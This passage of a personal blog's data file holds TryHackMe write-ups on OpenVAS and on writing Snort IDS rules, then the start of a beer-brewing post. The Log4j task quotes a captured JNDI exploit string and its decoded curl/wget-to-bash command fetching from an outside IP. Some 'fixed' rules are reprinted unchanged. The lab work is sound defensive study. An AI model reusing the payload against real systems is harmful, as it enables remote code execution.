Forum](https:/forum.greenbone.nett/error-no-users-found-you-need-to-create-at-least-one-user-to-log-in10528).\\n* reboot, without this I was getting a strange permissions error on my home directory.  These issues were highlighted by running `sudo gvm-check-setup`\\n* create a postgres user with `sudo runuser -u _postgres -- usrsharegvmcreate-postgresql-database`\\n* start redis with `sudo systemctl start redis-server@openvas.service`  With that I was able to login.  ### Task 7 - Practical Vulnerability Management  #### Question 1  When did the scan start in Case 001?  #### Answer\\n> Feb 28, 00:04:46 [Reveal Answer](#) #### Question 2  When did the scan end in Case 001?  #### Answer\\n> Feb 28, 00:21:02 [Reveal Answer](#) #### Question 3  How many ports are open in Case 001?  #### Answer\\n> 3 [Reveal Answer](#) #### Question 4  How many total vulnerabilities were found in Case 001?  #### Answer\\n> 5 [Reveal Answer](#) #### Question 5  What is the highest severity vulnerability found? (MSxx-xxx)  #### Answer\\n> MS17-010 [Reveal Answer](#) #### Question 6  What is the first affected OS to this vulnerability?  #### Answer\\n> Microsoft Windows 10 x32x64 Edition [Reveal Answer](#) #### Question 7  What is the recommended vulnerability detection method?  #### Answer\\n> Send the crafted SMB transaction request with fid = 0 and check the response to confirm the vulnerability. [Reveal Answer](#)"},{"id":"/2023/06/02/tryhackme-snort-challenges-1","metadata":{"permalink":"/docs/blog/2023/06/02/tryhackme-snort-challenges-1","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-06-02-tryhackme-snort-challenges-1.md","source":"@site/blog/2023-06-02-tryhackme-snort-challenges-1.md","title":"Try Hack Me, Snort Challenges, The Basics","description":"This is my first Try Hack Me write up, the room is Snort Challenge, The Basics.","date":"2023-06-02T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"snort","permalink":"/docs/blog/tags/snort"}],"readingTime":19.14,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, Snort Challenges, The Basics","authors":["mark-burton"],"tags":["tryhackme","snort"],"description":"This is my first Try Hack Me write up, the room is Snort Challenge, The Basics.","date":"2023-06-02"},"unlisted":false,"prevItem":{"title":"Try Hack Me, OpenVAS","permalink":"/docs/blog/2023/06/19/tryhackme-openvas"},"nextItem":{"title":"Brew Day","permalink":"/docs/blog/2023/04/22/brew-day"}},"content":"## Snort Challenge - The Basics  This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.  ### Task 1 - Introduction  Start the machine, that\'s it.  ### Task 2 - Writing IDS Rules (HTTP)  Let\'s create IDS Rules for HTTP traffic!\\nAnswer the questions below\\nNavigate to the task folder.  Use the given pcap file.  Write rules to detect \\"all TCP port 80 traffic\\" packets in the given pcap file.  #### Question 1\\nWhat is the number of detected packets?  Note: You must answer this question correctly before answering the rest of the questions in this task.  :::info\\nHint: You need to investigate inbound and outbound traffic on port 80. Writing two simple rules will help you. \\n:::\\n#### Notes  In the previous channel task 9 covers the structure of a snort rule which is summarized as  Action | Protocol | Source IP | Source Port | Direction | Dest IP | Dest Port | Options  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Alert  | TCP  |  |  |  |  |  | Msg  Drop  | UDP  |  ANY  |  ANY  |  &lt;>  |  ANY  |  ANY  | Reference  Reject | IMCP  |  |  |  |  |  | SID  |  |  |  |  |  |  | Rev  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Rule Header  | Rule Options  The hint says to make 2 rules, 1 rule for port 80 source and port 80 destination,  ``` bash\\nalert tcp any 80 &lt;&gt; any any (msg: \\"port 80 origin\\"; sid: 100001; rev: 1;)\\nalert tcp any any &lt;&gt; any 80 (msg: \\"port 80 destination\\"; sid: 100002; rev:1;)\\n```  Then run snort with the local rules\\n``` bash\\nsnort -c local.rules -A full -l . -r mx-3.pcap\\n```  ``` bash\\nAction Stats:  Alerts:  ??? ( 71.304%)  Logged:  ??? ( 71.304%)\\n```  #### Answer\\n&gt; 328 [Reveal Answer](#) #### Question 2\\n> Investigate the log file.  What is the destination address of packet 63?  I got to the answer using the following snort command.  ``` bash\\nsnort -c local.rules -r mx-3.pcap -A console -n 63\\n```  But that isn\'t what the question asks, it specifically says `Investigate the log file.` so to read the log file instead use the command below.  ``` bash\\nsudo snort -r snort.log.1680776108 -n 64\\n```  ``` bash\\n0513-10:17:10.205385  [**] [1:100001:1] port 80 origin [**] [Priority: 0] 65.208.228.223:80 -> 145.254.160.237:3372\\n```  #### Answer\\n> 145.254.160.237 [Reveal Answer](#) #### Question 3  Investigate the log file.  What is the ACK number of packet 64?  ##### Notes  Similar to the previous question.  ``` bash\\nsudo snort -r snort.log.1686080304 -n 64\\n```  ``` bash\\nWARNING: No preprocessors configured for policy 0.\\n0513-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372\\nTCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF\\n***A**** Seq: 0x114C66F0  Ack: 0x????????  Win: 0x1920  TcpLen: 20\\n```  #### Answer\\n> 0x38AFFFF3 [Reveal Answer](#) #### Question 4  Investigate the log file.  What is the SEQ number of packet 62?  ``` bash\\nsudo snort -r snort.log.1686080304 -n 62\\n```  ``` bash\\nWARNING: No preprocessors configured for policy 0.\\n0513-10:17:09.123830 145.254.160.237:3372 -> 65.208.228.223:80\\nTCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF\\n***A**** Seq: 0x????????  Ack: 0x114C66F0  Win: 0x25BC  TcpLen: 20\\n```  #### Answer\\n> 0x38AFFFF3 [Reveal Answer](#) #### Question 5  Investigate the log file.  What is the TTL number of packet 65?  ``` bash\\nsudo snort -r snort.log.1686080304 -n 65\\n```  ``` bash\\nWARNING: No preprocessors configured for policy 0.\\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20  ```  #### Answer\\n> 128 [Reveal Answer](#) #### Question 6  Investigate the log file.  What is the source IP number of packet 65?  ``` bash\\nsudo snort -r snort.log.1686080304 -n 65\\n```  ``` bash\\nWARNING: No preprocessors configured for policy 0.\\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20\\n```  #### Answer\\n> 145.254.160.237 [Reveal Answer](#) #### Question 7  Investigate the log file.  What is the source port of packet 65?  ``` bash\\nsudo snort -r snort.log.1686080304 -n 65\\n```  ``` bash\\nWARNING: No preprocessors configured for policy 0.\\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20\\n```  #### Answer\\n> 3372 [Reveal Answer](#) ### Task 3 - Writing IDS Rules (FTP)  Let\'s create IDS Rules for FTP traffic!\\nAnswer the questions below\\nNavigate to the task folder.  Use the given pcap file.  Write rules to detect \\"all TCP port 21\\"  traffic in the given pcap.  ``` bash\\nalert tcp any 21 &lt;> any any (msg: \\"port 21 origin\\"; sid: 100001; rev: 1;)\\nalert tcp any any &lt;&gt; any 21 (msg: \\"port 21 destination\\"; sid: 100002; rev:1;)\\n```  ``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Question 1  What is the number of detected packets?  #### Answer\\n&gt; 614 [Reveal Answer](#) #### Question 2  Investigate the log file.  What is the FTP service name?  #### Answer\\n> Microsoft FTP Service [Reveal Answer](#) #### Question 3  **Clear the previous log and alarm files.**  Deactivatecomment on the old rules.  Write a rule to detect failed FTP login attempts in the given pcap.  What is the number of detected packets?  ##### notes  I know from mistyping a FTP login enough times that 530 is the code for a failed FTP login.  Looking at the previous log I can see entries like `530 User admin cannot log in.`  So from the previous channel, **Payload Detection Rule Options**, it looks like I can use the `content:` to search for the 530.  ``` bash\\nalert tcp any 21 &lt;> any any (msg: \\"port 21 origin\\"; content:\\"530 \\"; sid: 100001; rev: 1;)\\nalert tcp any any &lt;&gt; any 21 (msg: \\"port 21 destination\\"; content:\\"530 \\"; sid: 100002; rev:1;)\\n```  This gives the answer 82 which is not correct.  :::info\\nHint: Each failed FTP login attempt prompts a default message with the pattern; \\"530 User\\". Try to filter the given pattern in the inbound FTP traffic. \\n:::\\nSo the hint helps, the rule should only be for inbound.  ``` bash\\nalert tcp any 21 &lt;&gt; any any (msg: \\"port 21 origin\\"; content:\\"530 \\"; sid: 100001; rev: 1;)\\n```  Run snort again to read the pcap with the new rule\\n``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n&gt; 41 [Reveal Answer](#) #### Question 4  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect successful FTP logins in the given pcap.  What is the number of detected packets?  ##### Notes  Similar to the last quesiton but the code is 230  ``` bash\\nalert tcp any 21 &lt;&gt; any any (msg: \\"port 21 origin\\"; content:\\"230 \\"; sid: 100001; rev: 1;)\\n```  Run snort again to read the pcap with the new rule\\n``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n> 1 [Reveal Answer](#) #### Question 5  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.  What is the number of detected packets?  ##### Notes\\nLooking at the output from the rule in question 1 there are several entries for `331 Password required for fred.` so I tried a rule for 331 in the body, same as the previous question it only makes sense to look for inbound traffic.  ``` bash\\nalert tcp any 21 &lt;&gt; any any (msg: \\"port 21 origin\\"; content:\\"331 \\"; sid: 100001; rev: 1;)\\n```  Run snort again to read the pcap with the new rule\\n``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n> 42 [Reveal Answer](#) #### Question 6  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect failed FTP login attempts with \\"Administrator\\" username but a bad password or no password.  What is the number of detected packets?  ##### Notes  This builds on the previous answers, so a rule like this could work  ``` bash\\nalert tcp any any &lt;> any 21 (msg: \\"port 21 destination\\"; content:\\"331 Password required for Administrator\\"; sid: 100001; rev: 1;)\\n```  But that is a kind of basic inflexible way to achieve it, lets make it more complex with the aid of a regex  ``` bash\\nalert tcp any any &lt;&gt; any 21 (msg: \\"port 21 destination\\"; pcre:\\"(331).*(administrator)ix\\"; sid: 100001; rev: 1;)\\n```  Run snort again to read the pcap with the new rule\\n``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n&gt; 7 [Reveal Answer](#) ### Task 3 - Writing IDS Rules (PNG)  Let\'s create IDS Rules for PNG files in the traffic!  #### Question 1  Use the given pcap file.  Write a rule to detect the PNG file in the given pcap.  Investigate the logs and identify the software name embedded in the packet.  ##### Notes  I could not figure this out from the channel, I tried a simple rule like  ``` bash\\nalert tcp any any -> any any (content:\\"png\\"; msg:\\"PNG\\";sid:10002; rev:1;)\\n```  It gave some results but nothing useful to answer the question.  After some googling and trying to avoid other writeups I came across this article on [asecuritysite.com](https:/asecuritysite.comforensicssnort?fname=with_pdf.pcap&rulesname=rulessig.rules) which included the rule  ``` bash\\nalert tcp any any -> any any (content:\\"|89 50 4E 47|\\"; msg:\\"PNG\\";sid:10002)\\n```  I remember from a previous channel that the more certain way to identify a file rather then trusting the file extension is the files magic number or magic bytes, for png that is `89 50 4E 47`.  With that rule in place run snort to read the pcap with the new rule\\n``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n> adobe imageready [Reveal Answer](#) #### Question 2  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect the GIF file in the given pcap.  Investigate the logs and identify the image format embedded in the packet.  ##### Notes  Based on the previous question I assume we are looking for the magic bytes for gif, that can be `47 49 46 38 37 61` for GIF87a or `47 49 46 38 39 61` for GIF89a.  Change the previous rule slightly and  ``` bash\\nalert tcp any any -> any any (content:\\"|47 49 46 38 39 61|\\"; msg:\\"PNG\\";sid:10002)\\n```  With that rule in place run snort to read the pcap with the new rule  ``` bash\\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\\n```  #### Answer\\n> GIF89a [Reveal Answer](#) ### Task 5 - Writing IDS Rules (Torrent Metafile)  Let\'s create IDS Rules for torrent metafiles in the traffic!  #### Question 1  Use the given pcap file.  Write a rule to detect the torrent metafile in the given pcap.  ##### Notes  A torrent meta file has an extension of `.torrent` lets see if that finds anything.  ``` bash\\nalert tcp any any -> any any (content:\\".torrent\\"; msg:\\"PNG\\";sid:10002)\\n```  With that rule in place run snort to read the pcap with the new rule  ``` bash\\nsnort -c local.rules -A full -l . -r torrent.pcap\\n```  Seems to work.  #### Answer\\n> 2 [Reveal Answer](#) #### Question 2  Investigate the logalarm files.  What is the name of the torrent application?  ##### Notes  This is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\\n\ufffd\u9950^V\ufffd^K\ufffdrP^X\\"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\\nAccept: application?-??????????\\nAccept-Encoding: gzip\\nUser-Agent: RAZA 2.1.0.0\\nHost: ????????.??????????.???:2710\\nConnection: Keep-Alive\\n```  #### Answer\\n> bittorrent [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?  ##### Notes  Again this is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\\n\ufffd\u9950^V\ufffd^K\ufffdrP^X\\"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\\nAccept: application?-??????????\\nAccept-Encoding: gzip\\nUser-Agent: RAZA 2.1.0.0\\nHost: ????????.??????????.???:2710\\nConnection: Keep-Alive\\n```  #### Answer\\n> applicationx-bittorrent [Reveal Answer](#) #### Question 4  Investigate the logalarm files.  What is the hostname of the torrent metafile?  ##### Notes  Again this is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\\n\ufffd\u9950^V\ufffd^K\ufffdrP^X\\"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\\nAccept: application?-??????????\\nAccept-Encoding: gzip\\nUser-Agent: RAZA 2.1.0.0\\nHost: ????????.??????????.???:2710\\nConnection: Keep-Alive\\n```  #### Answer\\n> tracker2.torrentbox.com [Reveal Answer](#) ### Task 6 - Troubleshooting Rule Syntax Errors  Let\'s troubleshoot rule syntax errors!  In this section, you need to fix the syntax errors in the given rule files.  You can test each ruleset with the following command structure;  ``` bash\\nsudo snort -c local-X.rules -r mx-1.pcap -A console\\n```  #### Question 1  Fix the syntax error in local-1.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-1.rules` is;  ``` bash\\nalert tcp any 3372 -> any any(msg: \\"Troubleshooting 1\\"; sid:1000001; rev:1;)\\n```  Running snort with the provided command gives the following error;  ``` bash\\nInitializing rule chains...\\nERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)\\n>>any(msg:\\n> >^\\n> ```  This is a missing space between any and the opening bracket, the fixed rule is;  ``` bash\\nalert tcp any 3372 -> any any(msg: \\"Troubleshooting 1\\"; sid:1000001; rev:1;)\\n```  #### Answer\\n> 16 [Reveal Answer](#) #### Question 2  Fix the syntax error in local-2.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-2.rules` is;  ``` bash\\nalert icmp any -> any any (msg: \\"Troubleshooting 2\\"; sid:1000001; rev:1;)\\n```  Running snort with the provided command gives the following error;  ``` bash\\nInitializing rule chains...\\nERROR: local-2.rules(8) Port value missing in rule!\\nFatal Error, Quitting..\\n```  This time the port number is missing from the origin part of the rule, the fixed rule is;  ``` bash\\nalert tcp any any -> any any(msg: \\"Troubleshooting 2\\"; sid:1000001; rev:1;)\\n```  #### Answer\\n> 68 [Reveal Answer](#) #### Question 3  Fix the syntax error in local-3.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-3.rules` is;  ``` bash\\nalert icmp any any -> any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert tcp any any -> any 80,443 (msg: \\"HTTPX Packet Found\\"; sid:1000001; rev:1;)\\n```  Running snort with the provided command gives the following error;  ``` bash\\nInitializing rule chains...\\nERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.\\nFatal Error, Quitting..\\n```  This time the tells us the same SID is used in 2 different rules, the fixed rule is;  ``` bash\\nalert icmp any any -> any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert tcp any any -> any 80,443 (msg: \\"HTTPX Packet Found\\"; sid:1000002; rev:1;)\\n```  #### Answer\\n> 87 [Reveal Answer](#) #### Question 4  Fix the syntax error in local-4.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-4.rules` is;  ``` bash\\nalert icmp any any -> any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert tcp any 80,443 -> any any (msg: \\"HTTPX Packet Found\\": sid:1000001; rev:1;)\\n```  Running snort with the provided command gives the following error;  ``` bash\\nInitializing rule chains...\\nERROR: local-4.rules(9) Unmatch quote in rule option \'msg\'.\\nFatal Error, Quitting..\\n```  The error is a little misleading and it is easier to see the problem with the syntax highlighting, rather than it being an unmatched quote it is a colon instead of a semi-colon after msg in the second rule. There is a second issue which is the same as the previous question, the SID is the same in both rules, the fixed rule is;  ``` bash\\nalert icmp any any -> any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert tcp any 80,443 -> any any (msg: \\"HTTPX Packet Found\\"; sid:1000001; rev:1;)\\n```  #### Answer\\n> 90 [Reveal Answer](#) #### Question 5  Fix the syntax error in local-4.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-5.rules` is;  ``` bash\\nalert icmp any any &lt;> any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert icmp any any <- any any (msg: \\"Inbound ICMP Packet Found\\"; sid;1000002; rev:1;)\\nalert tcp any any -> any 80,443 (msg: \\"HTTPX Packet Found\\": sid:1000003; rev:1;)\\n```  Running snort with the provided command gives the following error;  ``` bash\\nInitializing rule chains...\\nERROR: local-5.rules(9) Illegal direction specifier: &lt;-\\nFatal Error, Quitting..\\n```  From the previous channel I know that snort does not have a `&lt;-` operator, since rule 2 is any ip and port in either direction is assume `&lt;&gt;` is the correct operator. There is a second problem in the second rule, the separator between the sid name and the value is a semi-colon instead of a colon. Finally a third problem in the 3rd rule, the separator between msg and sid is again a colon rather than semi-colon, the fix rule is;  ``` bash\\nalert icmp any any &lt;&gt; any any (msg: \\"ICMP Packet Found\\"; sid:1000001; rev:1;)\\nalert icmp any any &lt;&gt; any any (msg: \\"Inbound ICMP Packet Found\\"; sid:1000002; rev:1;)\\nalert tcp any any -&gt; any 80,443 (msg: \\"HTTPX Packet Found\\"; sid:1000003; rev:1;)\\n```  #### Answer\\n&gt; 155 [Reveal Answer](#) #### Question 6  Fix the logical error in local-6.rules file and make it work smoothly to create alerts.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-6.rules` is;  ``` bash\\nalert tcp any any &lt;&gt; any 80  (msg: \\"GET Request Found\\"; content:\\"|67 65 74|\\"; sid: 100001; rev:1;)\\n```  This time there is no error, but the rule returns no alerts.  The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting `67 65 74` into a hex to ascii convertor returns `get`.  I didn\'t see the answer so used the hint.  :::info\\nHint: Case sensitivity matters! Use the capitals or nocase! \\n:::\\nNow the logical error is a little clearer, the content is looking for `get` but http verbs are generally uppercase `GET`.  The hint explains to add the nocase or use uppercase letters in the content, so there are 2 possible rules that can be used;  ``` bash\\nalert tcp any any &lt;&gt; any 80  (msg: \\"GET Request Found\\"; content:\\"|67 65 74|\\"; nocase; sid: 100001; rev:1;)\\n```  or  ``` bash\\nalert tcp any any &lt;&gt; any 80  (msg: \\"GET Request Found\\"; content:\\"|47 45 54|\\"; sid: 100001; rev:1;)\\n```  #### Answer\\n&gt; 2 [Reveal Answer](#) #### Question 7  Fix the logical error in local-7.rules file and make it work smoothly to create alerts.  What is the name of the required option:  ##### Notes  The rule defined in `local-7.rules` is;  ``` bash\\nalert tcp any any &lt;> any 80  (content:\\"|2E 68 74 6D 6C|\\"; sid: 100001; rev:1;)\\n```  Again there is no error, but the rule returns 9 alerts while the answer is 3 digits.  The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting `2E 68 74 6D 6C` into a hex to ascii convertor returns `.html`.  I didn\'t see the answer so used the hint.  :::info\\nHint: Rules without messages doesn\'t make sense! \\n:::\\nThat is annoying, all it needs is a message.  ``` bash\\nalert tcp any any &lt;&gt; any 80  (msg: \\"HTML file\\"; content:\\"|2E 68 74 6D 6C|\\"; sid: 100001; rev:1;)\\n```  #### Answer\\n&gt; msg [Reveal Answer](#) ### Task 7 - Using External Rules (MS17-010)  Let\'s use external rules to fight against the latest threats!  Use the given pcap file.  #### Question 1  Use the given rule file (local.rules) to investigate the ms1710 exploitation.  What is the number of detected packets?  #### Answer\\n> 25154 [Reveal Answer](#) #### Question 2  **Clear the previous log and alarm files.**  Use local-1.rules empty file to write a new rule to detect payloads containing the \\"\\\\IPC$\\" keyword.  What is the number of detected packets?  ##### Notes  The backslash causes problems, so once the string has been converted to hex I had the following rule:  ``` bash\\nalert tcp any any &lt;&gt; any any  (msg: \\"\\\\IPC$\\"; content:\\"|5c 49 50 43 24|\\"; sid: 100001; rev:1;)\\n```  #### Answer\\n> 12 [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What is the requested path?  ##### Notes  The snort log has entries like  ```\\n^@^@^@^@^@[\ufffdSMBu^@^@^@^@^X^A ^@^@^@^@^@^@^@^@^@^@K^@^H\ufffd^^D\ufffd^@^@^@^@^@^A^@^\\\\^@^@\\\\\\\\192.168.116.138\\\\IPC$^@????^@TH_REPLACE\\n```  #### Answer\\n> smb\\\\\\\\192.168.116.138\\\\IPC$ [Reveal Answer](#) #### Question 4  What is the CVSS v2 score of the MS17-010 vulnerability?  ##### Notes  https:/www.cvedetails.comcveCVE-2017-0144/  #### Answer\\n> 9.3 [Reveal Answer](#) ### Task 8 - Using External Rules (Log4j)  Let\'s use external rules to fight against the latest threats!  Use the given pcap file.  #### Question 1  Use the given rule file (local.rules) to investigate the log4j exploitation.  What is the number of detected packets?  #### Answer\\n> 26 [Reveal Answer](#) #### Question 2  Investigate the logalarm files.  How many rules were triggered?.  #### Answer\\n> 4 [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What are the first six digits of the triggered rule sids?  #### Answer\\n> 210037 [Reveal Answer](#) #### Question 4  Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.  What is the number of detected packets?  ##### Notes  :::info\\nHint: The \\"dsize\\" option will help you to filter the payload size. \\n:::\\nA little more info on [dsize syntax](http:/manual-snort-org.s3-website-us-east-1.amazonaws.comnode33.html#SECTION00467000000000000000)  The rule can look like the below;  ``` bash\\nalert tcp any any &lt;> any any (msg: \\"Between 770 and 885 bytes\\"; dsize:770&lt;&gt;855; sid: 100001; rev:1;)\\n```  Run snort  ``` bash\\nsnort -c local-1.rules -A full -l . -r log4j.pcap\\n```  #### Answer\\n&gt; 41 [Reveal Answer](#) #### Question 5  Investigate the logalarm files.  What is the name of the used encoding algorithm?  ##### Notes  Quick read of the log file and I noticed this  > ^v^D\ufffdc\ufffd\ufffd\ufffdGET ?x=$\\\\\\\\{jndi:ldap:/45.155.205.233:12344BasicCommand??????KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=\\\\} HTTP1.1  #### Answer\\n> Base64 [Reveal Answer](#) #### Question 6  Investigate the logalarm files.  What is the IP ID of the corresponding packet?  ##### Notes  I don\'t know why this is the answer, it is one of the many entries in the alert file.  #### Answer\\n> 62808 [Reveal Answer](#) #### Question 7  Investigate the logalarm files.  Decode the encoded command.  What is the attacker\'s command?  ##### Notes  The Base64 encoded string is part of the url in question 5 `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` it just needs decoding.  #### Answer\\n> (curl -s 45.155.205.233:5874162.0.228.253:80||wget -q -O- 45.155.205.233:5874162.0.228.253:80)|bash [Reveal Answer](#) #### Question 8  What is the CVSS v2 score of the Log4j vulnerability?  ##### Notes  [NIST cve-2021-44228](https:/nvd.nist.govvulndetailcve-2021-44228)  #### Answer\\n> 9.3  [Reveal Answer](#) ### Conclusion  Congratulations! Are you brave enough to stop a live attack in the [Snort2 Challenge 2](https:/tryhackme.comroomsnortchallenges2) room?  Check back soon for my write up of Snort Challenge 2."},{"id":"/2023/04/22/brew-day","metadata":{"permalink":"/docs/blog/2023/04/22/brew-day","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-04-22-brew-day.md","source":"@site/blog/2023-04-22-brew-day.md","title":"Brew Day","description":"Brewing a Belgian blonde inspired beer.","date":"2023-04-22T00:00:00.000Z","tags":[{"inline":true,"label":"beer","permalink":"/docs/blog/tags/beer"}],"readingTime":1.67,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Brew Day","authors":["mark-burton"],"tags":["beer"],"description":"Brewing a Belgian blonde inspired beer.","date":"2023-04-22"},"unlisted":false,"prevItem":{"title":"Try Hack Me, Snort Challenges, The Basics","permalink":"/docs/blog/2023/06/02/tryhackme-snort-challenges-1"},"nextItem":{"title":"Teenager Dog Training Session 1","permalink":"/docs/blog/2023/02/05/Teenager-Dog-Training-Session-1"}},"content":"* Pale Ale Malt - 3.330 kg\\n* Pilsner Malt - 3.330 kg\\n* Munich Malt - Dark - 0.700 kg\\n* Caramel 100 - 38L - 0.150 kg\\n\\nEach bring different different characteristics to the beer.\\n\\n![Network settings with 127.0.0.1 as DNS server](/img/milling.jpg)\\n\\n## Brew Day +1 - Fermentation\\n\\nAfter 24 hours at 22c\\n\\n<video controls width=\\"250\\">\\n  <source src=\\"/img/videos/fermentation_bucket_with_airlock.mp4\\" type=\\"video/mp4\\" />\\n  <a href=\\"/img/videos/fermentation_bucket_with_airlock.mp4\\">MP4 video</a>\\n</video>\\n\\n## Brew Day +5 - Cold Crash\\n\\nFermentation is complete, the warm uncarbonated beer is giving off boozy banana and spicy notes.\\n\\nTaste wise it has a first hit of sweetness with a medium body. Some banana, booze spice, followed by a slightly sour finish.\\n\\nTime now to cool the beer to 2c which will stop any remaining yeast activity and cause the sediment to sink to the bottom.\\n\\nAs the cooling happens it is possible for the pressure differential between the fermentation bucket and the fridge to lead to air from the fridge being sucked through the air lock, this could lead to oxidization which could affect the taste of the beer, placing a balloon filled with CO2 over the air lock can protect against that.\\n\\n## Brew Day +7 - Kegging\\n\\nSanitization! Sanitization! Sanitization!\\n\\nSanitize everything, every connection, the keg, the tap on the fermentation bucket, the pipes and use CO2 to purge the keg.\\n\\nCreate a closed loop between the keg and the fermentation bucket.\\n\\nThe pressure in the keg and gravity will push the beer into the keg. It is important to have the right pressure in the keg, too much and the fermentation bucket could explode, too little and it will take a long time for the beer to flow into the keg, so not **PPPPSSSSSTTTTT** and not pppssssstttt but PPPPPSSSTTTT!\\n\\n## Carbonation\\n\\nApproaches to forced carbonation of beer can be categorized as;\\n\\n* Set & Forget Method\\n* Semi-Speed Carbonation Method\\n* Rapid Force Carbonation Method\\n\\n[Keg King](https://www.kegking.com.au/blog/post/how-to-carbonate-beer-in-a-keg)\\n[Jolly Good 